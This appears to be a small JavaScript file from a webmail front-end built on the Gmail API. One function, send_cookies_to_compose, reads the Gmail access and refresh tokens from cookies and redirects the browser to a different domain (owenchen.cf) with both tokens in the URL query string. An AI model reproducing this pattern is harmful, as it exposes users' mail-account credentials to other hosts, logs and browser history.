function getMessageShow(msg_id, token) {
    window.location.href = 'https://nsysunmail.ml/show?id=' + msg_id + '&query=' + token;
}

function getSelectedCheckbox(action) {
    const checkboxes = document.querySelectorAll(`input[name="a_mail"]:checked`);
    let valus_str = ""
    let values = [];
    checkboxes.forEach((checkbox) => {
        values.push(checkbox.value);
    });
    for (let i = 0; i < values.length; i++) {
        if (i == 0) {
            valus_str += values[i]
        } else {
            valus_str += " " + values[i]
        }
    }
    window.location.href = 'https://nsysunmail.ml/modify?action=' + action + '&modify_list=' + valus_str;
}

function send_cookies_to_compose() {
    allcookies = document.cookie.split(";");
    for (let i = 0; i < allcookies.length; i++) {
        thisCookie = allcookies[i].split("=");
        cName = unescape(thisCookie[0]);
        cValue = unescape(thisCookie[1]);
        if (cName.indexOf("gmailapi_token") != -1) { var token = cValue; }
        if (cName.indexOf("gmailapi_refresh_token") != -1) { var refresh_token = cValue; }
    }
    window.location.href = 'https://owenchen.cf/compose?token=' + token + '&refresh_token=' + refresh_token;
}
